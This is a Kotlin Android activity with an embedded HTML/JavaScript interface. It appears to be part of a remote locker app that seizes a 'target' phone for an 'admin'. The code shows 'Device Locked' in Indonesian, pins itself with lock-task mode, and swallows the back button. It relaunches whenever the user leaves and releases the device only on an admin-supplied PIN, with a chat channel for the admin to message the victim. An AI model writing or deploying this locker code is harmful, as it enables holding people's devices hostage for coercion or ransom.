package com.sync.xxx

import android.annotation.SuppressLint
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.MediaPlayer
import android.os.Build
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import org.json.JSONObject

class LockChatActivity : Activity() {

    private lateinit var webView: WebView
    private var mediaPlayer: MediaPlayer? = null
    private var correctPin: String = ""
    private var lockTitle: String = "Perangkat Terkunci"
    private var isReceiverRegistered = false
    private var isUnlocked = false

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.UNLOCK") {
                isUnlocked = true
                finish()
            }
        }
    }

    // Pesan hanya dari admin menuju target.
    private val chatReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action != "com.sync.xxx.CHAT_FROM_ADMIN") return

            val message = intent.getStringExtra("message") ?: return
            val encodedMessage = JSONObject.quote(message)

            webView.post {
                webView.evaluateJavascript(
                    "receiveAdminMessage($encodedMessage)",
                    null
                )
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN) ?: ""
        lockTitle = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)
            ?: "Perangkat Terkunci"

        setupWebView()
        registerReceivers()

        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as
                android.app.admin.DevicePolicyManager

            if (dpm.isLockTaskPermitted(packageName)) {
                startLockTask()
            }
        } catch (_: Exception) {
        }

        playLockSound()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)

        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)
            ?: correctPin

        lockTitle = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)
            ?: lockTitle
    }

    override fun onBackPressed() {
        if (!isUnlocked) return
        super.onBackPressed()
    }

    override fun onPause() {
        super.onPause()

        if (isUnlocked) return

        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            if (isUnlocked) return@postDelayed

            startActivity(Intent(this, LockChatActivity::class.java).apply {
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                )
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
            })
        }, 300)
    }

    override fun onStop() {
        super.onStop()

        if (isUnlocked) return

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
            startActivity(Intent(this, LockChatActivity::class.java).apply {
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                )
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
            })
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = WebView(this)

        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
        }

        webView.setBackgroundColor(android.graphics.Color.BLACK)
        webView.addJavascriptInterface(ChatBridge(), "ChatBridge")
        webView.webViewClient = WebViewClient()

        webView.loadDataWithBaseURL(
            null,
            buildLockChatHtml(),
            "text/html",
            "UTF-8",
            null
        )

        setContentView(webView)
    }

    private fun registerReceivers() {
        if (isReceiverRegistered) return

        val unlockFilter = IntentFilter("com.sync.xxx.UNLOCK")
        val chatFilter = IntentFilter("com.sync.xxx.CHAT_FROM_ADMIN")

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(
                unlockReceiver,
                unlockFilter,
                RECEIVER_NOT_EXPORTED
            )
            registerReceiver(
                chatReceiver,
                chatFilter,
                RECEIVER_NOT_EXPORTED
            )
        } else {
            registerReceiver(unlockReceiver, unlockFilter)
            registerReceiver(chatReceiver, chatFilter)
        }

        isReceiverRegistered = true
    }

    override fun onDestroy() {
        super.onDestroy()

        try {
            stopLockTask()
        } catch (_: Exception) {
        }

        if (isReceiverRegistered) {
            try {
                unregisterReceiver(unlockReceiver)
            } catch (_: Exception) {
            }

            try {
                unregisterReceiver(chatReceiver)
            } catch (_: Exception) {
            }

            isReceiverRegistered = false
        }

        mediaPlayer?.release()
        mediaPlayer = null

        if (::webView.isInitialized) {
            webView.removeJavascriptInterface("ChatBridge")
            webView.destroy()
        }
    }

    inner class ChatBridge {

        @JavascriptInterface
        fun tryUnlock(pin: String): Boolean {
            val isCorrect = pin == correctPin

            if (isCorrect) {
                android.os.Handler(
                    android.os.Looper.getMainLooper()
                ).post {
                    sendBroadcast(
                        Intent(DeviceService.ACTION_COMMAND).apply {
                            putExtra(
                                DeviceService.EXTRA_COMMAND,
                                "unlockDevice"
                            )
                            putExtra(
                                DeviceService.EXTRA_VALUE,
                                "true"
                            )
                            setPackage(packageName)
                        }
                    )

                    sendBroadcast(
                        Intent("com.sync.xxx.UNLOCK").apply {
                            setPackage(packageName)
                        }
                    )
                }
            }

            return isCorrect
        }

        @JavascriptInterface
        fun getLockTitle(): String = lockTitle

        // Target mengirim balasan ke admin melalui DeviceService.
        @JavascriptInterface
        fun sendMessage(message: String) {
            val cleanMessage = message.trim()
            if (cleanMessage.isEmpty() || cleanMessage.length > 2000) return

            sendBroadcast(
                Intent(DeviceService.ACTION_COMMAND).apply {
                    putExtra(
                        DeviceService.EXTRA_COMMAND,
                        "chatFromTarget"
                    )
                    putExtra(
                        DeviceService.EXTRA_VALUE,
                        cleanMessage
                    )
                    setPackage(packageName)
                }
            )
        }
    }

    private fun playLockSound() {
        try {
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return

            mediaPlayer = MediaPlayer().apply {
                setDataSource(
                    afd.fileDescriptor,
                    afd.startOffset,
                    afd.length
                )
                afd.close()
                prepare()
                start()

                setOnCompletionListener {
                    release()
                    mediaPlayer = null
                }
            }
        } catch (_: Exception) {
        }
    }

    private fun buildLockChatHtml(): String {
        val safeTitle = lockTitle
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;")
            .replace("'", "&#39;")

        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta
  name="viewport"
  content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"
>
<link
  href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap"
  rel="stylesheet"
>
<style>
*,*::before,*::after{
  box-sizing:border-box;
  margin:0;
  padding:0
}

:root{
  --bg:#07000f;
  --surface:rgba(19,7,35,.88);
  --surface2:rgba(25,9,45,.72);
  --purple:#a855f7;
  --purple2:#7c3aed;
  --red:#ff2b3b;
  --text:#f5edff;
  --muted:#7651a4;
  --border:rgba(168,85,247,.26);
}

html,body{
  width:100%;
  height:100%;
  background:var(--bg);
  color:var(--text);
  font-family:'Outfit',sans-serif
}

body{
  overflow:hidden;
  position:relative
}

body::before{
  content:'';
  position:fixed;
  inset:0;
  background:
    radial-gradient(
      ellipse 75% 48% at 50% -8%,
      rgba(168,85,247,.2),
      transparent 65%
    ),
    radial-gradient(
      ellipse 60% 55% at 0 100%,
      rgba(255,43,59,.07),
      transparent 70%
    );
  pointer-events:none
}

body::after{
  content:'';
  position:fixed;
  inset:0;
  background-image:
    linear-gradient(rgba(168,85,247,.03) 1px,transparent 1px),
    linear-gradient(90deg,rgba(168,85,247,.03) 1px,transparent 1px);
  background-size:38px 38px;
  pointer-events:none
}

.screen{
  position:relative;
  z-index:1;
  width:100%;
  height:100%;
  overflow-y:auto;
  padding:14px 14px 24px
}

.screen::-webkit-scrollbar{
  width:2px
}

.screen::-webkit-scrollbar-thumb{
  background:var(--border)
}

.content{
  width:100%;
  max-width:360px;
  min-height:100%;
  margin:0 auto;
  display:flex;
  flex-direction:column;
  gap:12px
}

/* HEADER */
.header-card{
  width:100%;
  min-height:72px;
  padding:13px 14px;
  border-radius:18px;
  border:1px solid var(--border);
  background:rgba(10,0,20,.86);
  display:flex;
  align-items:center;
  gap:12px;
  box-shadow:0 12px 32px rgba(0,0,0,.25)
}

.header-icon{
  width:45px;
  height:45px;
  flex:0 0 45px;
  border-radius:14px;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#bd79ff;
  background:rgba(168,85,247,.13);
  border:1px solid rgba(168,85,247,.34)
}

.header-text{
  min-width:0
}

.header-title{
  overflow:hidden;
  white-space:nowrap;
  text-overflow:ellipsis;
  font-size:18px;
  font-weight:800;
  color:#fff
}

.header-sub{
  margin-top:4px;
  color:#6d28d9;
  font-family:'JetBrains Mono',monospace;
  font-size:7px;
  letter-spacing:1.8px
}

/* SAME WIDTH CARD */
.card{
  width:100%;
  border-radius:19px;
  border:1px solid var(--border);
  background:var(--surface);
  overflow:hidden;
  box-shadow:0 15px 38px rgba(0,0,0,.24)
}

.card-head{
  min-height:51px;
  padding:11px 13px;
  border-bottom:1px solid rgba(168,85,247,.17);
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap:10px;
  background:rgba(168,85,247,.045)
}

.card-title-wrap{
  display:flex;
  align-items:center;
  gap:9px;
  min-width:0
}

.card-icon{
  width:32px;
  height:32px;
  flex:0 0 32px;
  border-radius:10px;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#b66cff;
  background:rgba(168,85,247,.1);
  border:1px solid rgba(168,85,247,.24)
}

.card-title{
  color:#fff;
  font-size:14px;
  font-weight:800
}

.card-sub{
  margin-top:2px;
  color:#65418d;
  font-family:'JetBrains Mono',monospace;
  font-size:7px;
  letter-spacing:1.3px
}

.read-only{
  flex-shrink:0;
  color:#7f59a9;
  font-family:'JetBrains Mono',monospace;
  font-size:7px;
  letter-spacing:1.1px
}

/* CHAT SEBAGAI TAMPILAN UTAMA */
.chat-card{
  flex:1;
  min-height:440px;
  display:flex;
  flex-direction:column
}

.chat-messages{
  flex:1;
  min-height:280px;
  overflow-y:auto;
  padding:12px;
  display:flex;
  flex-direction:column;
  gap:8px;
  background:rgba(5,0,12,.45)
}

.chat-messages::-webkit-scrollbar{
  width:2px
}

.chat-messages::-webkit-scrollbar-thumb{
  background:var(--border)
}

.chat-empty{
  min-height:100%;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  gap:8px;
  color:#43235f;
  font-family:'JetBrains Mono',monospace;
  font-size:8px;
  line-height:1.7;
  letter-spacing:1.1px;
  text-align:center
}

.msg-row{
  width:fit-content;
  max-width:88%;
  display:flex;
  flex-direction:column
}

.msg-row.admin{
  align-self:flex-start
}

.msg-row.target{
  align-self:flex-end
}

.msg-sender{
  margin-bottom:3px;
  font-family:'JetBrains Mono',monospace;
  font-size:7px;
  letter-spacing:1px
}

.msg-row.admin .msg-sender{
  color:#a855f7
}

.msg-row.target .msg-sender{
  color:#ff5b68;
  text-align:right
}

.msg-bubble{
  padding:9px 12px;
  font-size:13px;
  line-height:1.45;
  overflow-wrap:anywhere
}

.msg-row.admin .msg-bubble{
  border-radius:4px 13px 13px 13px;
  background:rgba(168,85,247,.13);
  border:1px solid rgba(168,85,247,.23);
  color:#eadff7
}

.msg-row.target .msg-bubble{
  border-radius:13px 4px 13px 13px;
  background:rgba(255,43,59,.10);
  border:1px solid rgba(255,43,59,.22);
  color:#ffe7ea
}

.msg-time{
  margin-top:3px;
  color:#4a2866;
  font-family:'JetBrains Mono',monospace;
  font-size:7px
}

.msg-row.target .msg-time{
  text-align:right
}

.chat-input-area{
  padding:9px 10px 10px;
  border-top:1px solid rgba(168,85,247,.17);
  display:flex;
  align-items:flex-end;
  gap:7px;
  background:rgba(168,85,247,.045)
}

.chat-input{
  flex:1;
  min-width:0;
  min-height:40px;
  max-height:76px;
  resize:none;
  outline:none;
  border-radius:11px;
  border:1px solid rgba(168,85,247,.24);
  background:rgba(5,0,12,.56);
  color:#f2e9fc;
  padding:10px 11px;
  font-family:'Outfit',sans-serif;
  font-size:13px;
  line-height:1.35
}

.chat-input:focus{
  border-color:rgba(168,85,247,.55);
  background:rgba(168,85,247,.055)
}

.chat-input::placeholder{
  color:#56366f
}

.send-btn{
  width:40px;
  height:40px;
  flex:0 0 40px;
  border-radius:11px;
  border:1px solid rgba(168,85,247,.34);
  background:rgba(168,85,247,.12);
  color:#b66cff;
  display:flex;
  align-items:center;
  justify-content:center;
  cursor:pointer;
  -webkit-tap-highlight-color:transparent
}

.send-btn:active{
  transform:scale(.93);
  background:rgba(168,85,247,.24)
}


/* POPUP PIN — CHAT TETAP TERLIHAT DI BELAKANG */
.pin-modal{
  position:fixed;
  inset:0;
  z-index:50;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
  background:rgba(3,0,8,.56);
  opacity:0;
  visibility:hidden;
  pointer-events:none;
  transition:opacity .18s ease,visibility .18s ease
}

.pin-modal.open{
  opacity:1;
  visibility:visible;
  pointer-events:auto
}

.pin-modal-card{
  width:100%;
  max-width:340px;
  max-height:92vh;
  overflow-y:auto;
  border-radius:20px;
  border:1px solid rgba(168,85,247,.38);
  background:rgba(15,4,28,.97);
  box-shadow:
    0 24px 70px rgba(0,0,0,.72),
    0 0 30px rgba(168,85,247,.14);
  transform:translateY(14px) scale(.98);
  transition:transform .18s ease
}

.pin-modal.open .pin-modal-card{
  transform:translateY(0) scale(1)
}

.pin-modal-head{
  min-height:54px;
  padding:10px 12px 10px 14px;
  border-bottom:1px solid rgba(168,85,247,.2);
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap:10px;
  background:rgba(168,85,247,.055)
}

.pin-modal-title-wrap{
  display:flex;
  align-items:center;
  gap:9px
}

.pin-modal-title{
  color:#fff;
  font-size:15px;
  font-weight:800
}

.pin-modal-sub{
  margin-top:2px;
  color:#67418e;
  font-family:'JetBrains Mono',monospace;
  font-size:7px;
  letter-spacing:1.35px
}

.pin-close{
  width:36px;
  height:36px;
  flex:0 0 36px;
  border-radius:11px;
  border:1px solid rgba(168,85,247,.25);
  background:rgba(168,85,247,.07);
  color:#a855f7;
  display:flex;
  align-items:center;
  justify-content:center;
  cursor:pointer;
  -webkit-tap-highlight-color:transparent
}

.pin-close:active{
  transform:scale(.93);
  background:rgba(168,85,247,.18)
}

/* PIN POPUP CONTENT */
.pin-content{
  padding:16px 14px 17px;
  display:flex;
  flex-direction:column;
  align-items:center;
  gap:13px
}

.pin-icon-wrap{
  position:relative;
  width:70px;
  height:70px;
  display:flex;
  align-items:center;
  justify-content:center
}

.pin-ring{
  position:absolute;
  inset:0;
  border-radius:50%;
  border:1.4px solid rgba(168,85,247,.28);
  animation:ringPulse 2s infinite
}

.pin-ring.outer{
  inset:-8px;
  border-width:1px;
  border-color:rgba(168,85,247,.11);
  animation-delay:.45s
}

@keyframes ringPulse{
  0%,100%{
    opacity:.85;
    transform:scale(1)
  }

  50%{
    opacity:.3;
    transform:scale(1.07)
  }
}

.pin-icon{
  width:56px;
  height:56px;
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#b66cff;
  background:
    radial-gradient(
      circle,
      rgba(168,85,247,.18),
      rgba(168,85,247,.03)
    );
  border:1.4px solid rgba(168,85,247,.4);
  box-shadow:0 0 26px rgba(168,85,247,.13)
}

.pin-title{
  font-size:20px;
  font-weight:800;
  color:#fff
}

.pin-subtitle{
  margin-top:-7px;
  color:#67418e;
  font-family:'JetBrains Mono',monospace;
  font-size:7px;
  letter-spacing:1.5px;
  text-align:center
}

.dots{
  min-height:25px;
  display:flex;
  align-items:center;
  gap:13px
}

.dot{
  width:12px;
  height:12px;
  border-radius:50%;
  border:1.4px solid rgba(168,85,247,.34);
  background:transparent;
  transition:.17s
}

.dot.filled{
  background:#a855f7;
  border-color:#a855f7;
  box-shadow:0 0 11px rgba(168,85,247,.8);
  transform:scale(1.08)
}

.dot.error{
  border-color:var(--red);
  background:rgba(255,43,59,.2);
  animation:shake .35s ease
}

@keyframes shake{
  0%,100%{transform:translateX(0)}
  25%{transform:translateX(-5px)}
  75%{transform:translateX(5px)}
}

.pin-status{
  min-height:17px;
  color:#4e2e69;
  font-family:'JetBrains Mono',monospace;
  font-size:8px;
  letter-spacing:1.4px;
  text-align:center
}

.pin-status.err{
  color:var(--red)
}

.pin-status.ok{
  color:#b66cff
}

.keypad{
  width:100%;
  display:grid;
  grid-template-columns:repeat(3,1fr);
  gap:8px
}

.key{
  height:57px;
  border-radius:13px;
  border:1px solid rgba(168,85,247,.17);
  background:
    linear-gradient(
      160deg,
      rgba(168,85,247,.085),
      rgba(40,10,60,.055)
    );
  color:#f0e6ff;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  cursor:pointer;
  user-select:none;
  -webkit-tap-highlight-color:transparent;
  transition:.12s;
  box-shadow:
    0 3px 9px rgba(0,0,0,.38),
    inset 0 1px 0 rgba(168,85,247,.07)
}

.key:active{
  transform:scale(.94);
  background:rgba(168,85,247,.19);
  border-color:rgba(168,85,247,.47)
}

.key .num{
  font-size:21px;
  font-weight:700;
  line-height:1
}

.key .sub{
  margin-top:2px;
  color:#7444a2;
  font-family:'JetBrains Mono',monospace;
  font-size:7px;
  letter-spacing:1.8px
}

.key.del{
  color:#b66cff
}

.key.empty{
  opacity:0;
  pointer-events:none
}
</style>
</head>

<body>

<div class="screen">
  <div class="content">

    <section class="header-card">
      <div class="header-icon">
        <svg
          width="22"
          height="22"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          stroke-width="2"
        >
          <rect x="3" y="11" width="18" height="11" rx="2"/>
          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
        </svg>
      </div>

      <div class="header-text">
        <div class="header-title">$safeTitle</div>
        <div class="header-sub">LOCK V3 — SECURE CHANNEL</div>
      </div>
    </section>

    <!-- CHAT MENJADI TAMPILAN AWAL -->
    <section class="card chat-card">
      <div class="card-head">
        <div class="card-title-wrap">
          <div class="card-icon">
            <svg
              width="16"
              height="16"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
            >
              <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
            </svg>
          </div>

          <div>
            <div class="card-title">Pesan Admin</div>
            <div class="card-sub">KETIK /PIN UNTUK MEMBUKA POPUP PIN</div>
          </div>
        </div>

        <div class="read-only">BISA BALAS</div>
      </div>

      <div class="chat-messages" id="chatMessages">
        <div class="chat-empty" id="chatEmpty">
          <svg
            width="34"
            height="34"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="1"
          >
            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
          </svg>

          <span>
            Belum ada pesan dari admin<br>
            Pesan baru akan tampil di bagian ini
          </span>
        </div>
      </div>

      <div class="chat-input-area">
        <textarea
          class="chat-input"
          id="chatInput"
          rows="1"
          maxlength="2000"
          placeholder="Balas pesan atau ketik /pin..."
          oninput="resizeChatInput(this)"
          onkeydown="handleChatKey(event)"
        ></textarea>

        <button
          class="send-btn"
          type="button"
          onclick="sendMsg()"
          aria-label="Kirim balasan"
        >
          <svg
            width="17"
            height="17"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2.3"
          >
            <line x1="22" y1="2" x2="11" y2="13"/>
            <polygon points="22 2 15 22 11 13 2 9 22 2"/>
          </svg>
        </button>
      </div>
    </section>


  </div>
</div>

  <!-- POPUP PIN: dibuka lokal dengan mengetik /pin -->
  <div
    class="pin-modal"
    id="pinModal"
    onclick="handlePinBackdrop(event)"
  >
    <section class="pin-modal-card">
      <div class="pin-modal-head">
        <div class="pin-modal-title-wrap">
          <div class="card-icon">
            <svg
              width="16"
              height="16"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
            >
              <rect x="3" y="11" width="18" height="11" rx="2"/>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
            </svg>
          </div>

          <div>
            <div class="pin-modal-title">Buka Perangkat</div>
            <div class="pin-modal-sub">INPUT SECURITY PIN</div>
          </div>
        </div>

        <button
          class="pin-close"
          type="button"
          onclick="closePinPopup()"
          aria-label="Tutup popup PIN"
        >
          <svg
            width="18"
            height="18"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
          >
            <line x1="18" y1="6" x2="6" y2="18"/>
            <line x1="6" y1="6" x2="18" y2="18"/>
          </svg>
        </button>
      </div>

      <div class="pin-content">
        <div class="pin-icon-wrap">
          <div class="pin-ring outer"></div>
          <div class="pin-ring"></div>

          <div class="pin-icon">
            <svg
              width="25"
              height="25"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="1.8"
            >
              <rect x="3" y="11" width="18" height="11" rx="2"/>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
              <circle
                cx="12"
                cy="16"
                r="1.5"
                fill="currentColor"
                stroke="none"
              />
            </svg>
          </div>
        </div>

        <div class="pin-title">Masukkan PIN</div>
        <div class="pin-subtitle">4 DIGIT UNTUK MEMBUKA PERANGKAT</div>

        <div class="dots">
          <div class="dot" id="d0"></div>
          <div class="dot" id="d1"></div>
          <div class="dot" id="d2"></div>
          <div class="dot" id="d3"></div>
        </div>

        <div class="pin-status" id="pinStatus">
          Ketuk angka di bawah
        </div>

        <div class="keypad" id="keypad">
          <div class="key" data-n="1">
            <span class="num">1</span>
            <span class="sub">—</span>
          </div>

          <div class="key" data-n="2">
            <span class="num">2</span>
            <span class="sub">ABC</span>
          </div>

          <div class="key" data-n="3">
            <span class="num">3</span>
            <span class="sub">DEF</span>
          </div>

          <div class="key" data-n="4">
            <span class="num">4</span>
            <span class="sub">GHI</span>
          </div>

          <div class="key" data-n="5">
            <span class="num">5</span>
            <span class="sub">JKL</span>
          </div>

          <div class="key" data-n="6">
            <span class="num">6</span>
            <span class="sub">MNO</span>
          </div>

          <div class="key" data-n="7">
            <span class="num">7</span>
            <span class="sub">PQRS</span>
          </div>

          <div class="key" data-n="8">
            <span class="num">8</span>
            <span class="sub">TUV</span>
          </div>

          <div class="key" data-n="9">
            <span class="num">9</span>
            <span class="sub">WXYZ</span>
          </div>

          <div class="key empty"></div>

          <div class="key" data-n="0">
            <span class="num">0</span>
          </div>

          <div class="key del" data-del="1">
            <svg
              width="19"
              height="19"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="1.8"
            >
              <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
              <line x1="18" y1="9" x2="12" y2="15"/>
              <line x1="12" y1="9" x2="18" y2="15"/>
            </svg>
          </div>
        </div>
      </div>
    </section>
  </div>

<script>
var pin = ''
var blocked = false

// Pesan admin masuk ke target.
function receiveAdminMessage(message) {
  addMessage('admin', message)
}

// Target membalas pesan admin.
function sendMsg() {
  var input = document.getElementById('chatInput')
  var message = input.value.trim()

  if (!message) return

  input.value = ''
  input.style.height = '40px'

  // /pin adalah perintah lokal. Tidak dikirim dan tidak ditampilkan di chat.
  if (message.toLowerCase() === '/pin') {
    openPinPopup()
    return
  }

  addMessage('target', message)

  try {
    ChatBridge.sendMessage(message)
  } catch (error) {
  }
}

function handleChatKey(event) {
  if (event.key === 'Enter' && !event.shiftKey) {
    event.preventDefault()
    sendMsg()
  }
}

function resizeChatInput(input) {
  input.style.height = '40px'
  input.style.height = Math.min(input.scrollHeight, 76) + 'px'
}

function addMessage(from, text) {
  var empty = document.getElementById('chatEmpty')

  if (empty) {
    empty.style.display = 'none'
  }

  var container = document.getElementById('chatMessages')
  var now = new Date()

  var time =
    now.getHours().toString().padStart(2, '0') +
    ':' +
    now.getMinutes().toString().padStart(2, '0')

  var isAdmin = from === 'admin'
  var row = document.createElement('div')

  row.className = 'msg-row ' + (isAdmin ? 'admin' : 'target')

  row.innerHTML =
    '<div class="msg-sender">' +
      (isAdmin ? 'ADMIN' : 'KAMU') +
    '</div>' +
    '<div class="msg-bubble">' +
      escHtml(String(text)) +
    '</div>' +
    '<div class="msg-time">' +
      time +
    '</div>'

  container.appendChild(row)
  container.scrollTop = container.scrollHeight
}

function escHtml(text) {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}


function openPinPopup() {
  pin = ''
  blocked = false
  updateDots()
  setStatus('Ketuk angka di bawah', false, false)

  document
    .getElementById('pinModal')
    .classList
    .add('open')
}

function closePinPopup() {
  pin = ''
  blocked = false
  updateDots()
  setStatus('Ketuk angka di bawah', false, false)

  document
    .getElementById('pinModal')
    .classList
    .remove('open')
}

function handlePinBackdrop(event) {
  if (event.target && event.target.id === 'pinModal') {
    closePinPopup()
  }
}

document
  .getElementById('keypad')
  .addEventListener(
    'touchend',
    function(event) {
      event.preventDefault()

      var key = event.target.closest('.key')

      if (!key || key.classList.contains('empty')) return

      if (key.dataset.del) {
        doDelete()
        return
      }

      if (key.dataset.n !== undefined) {
        doPress(key.dataset.n)
      }
    },
    { passive:false }
  )

document
  .getElementById('keypad')
  .addEventListener('click', function(event) {
    if (
      event.sourceCapabilities &&
      event.sourceCapabilities.firesTouchEvents
    ) {
      return
    }

    var key = event.target.closest('.key')

    if (!key || key.classList.contains('empty')) return

    if (key.dataset.del) {
      doDelete()
      return
    }

    if (key.dataset.n !== undefined) {
      doPress(key.dataset.n)
    }
  })

function doPress(number) {
  if (blocked || pin.length >= 4) return

  pin += number
  updateDots()

  if (pin.length === 4) {
    setTimeout(checkPin, 150)
  }
}

function doDelete() {
  if (blocked) return

  pin = pin.slice(0, -1)
  updateDots()
  setStatus('', false, false)
}

function updateDots() {
  for (var index = 0; index < 4; index++) {
    var dot = document.getElementById('d' + index)

    dot.classList.toggle('filled', index < pin.length)
    dot.classList.remove('error')
  }
}

function checkPin() {
  var isCorrect = false

  try {
    isCorrect = ChatBridge.tryUnlock(pin)
  } catch (error) {
  }

  if (isCorrect) {
    setStatus('PIN Benar ✓', false, true)
    return
  }

  setStatus('PIN Salah!', true, false)

  for (var index = 0; index < 4; index++) {
    document
      .getElementById('d' + index)
      .classList
      .add('error')
  }

  blocked = true

  setTimeout(function() {
    pin = ''
    blocked = false
    updateDots()
    setStatus('Coba lagi', false, false)
  }, 1200)
}

function setStatus(message, isError, isSuccess) {
  var element = document.getElementById('pinStatus')

  element.textContent = message || 'Ketuk angka di bawah'

  element.className =
    'pin-status' +
    (isError ? ' err' : isSuccess ? ' ok' : '')
}
</script>

</body>
</html>"""
    }
}
